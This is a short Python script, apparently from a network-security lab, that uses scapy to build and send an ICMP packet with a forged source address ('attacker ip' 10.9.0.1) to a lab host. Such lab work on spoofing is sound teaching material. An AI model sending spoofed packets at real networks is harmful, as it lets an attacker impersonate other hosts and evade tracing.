#!/usr/bin/python3
from scapy.all import *
print ("SENDING SPOOFED ICMP PACKET...")
IPLayer = IP()
IPLayer.src="10.9.0.1" #attacker ip
IPLayer.dst="10.9.0.5" #hostA
ICMPpkt = ICMP()
pkt = IPLayer/ICMPpkt
pkt. show ()
send(pkt,verbose=0)

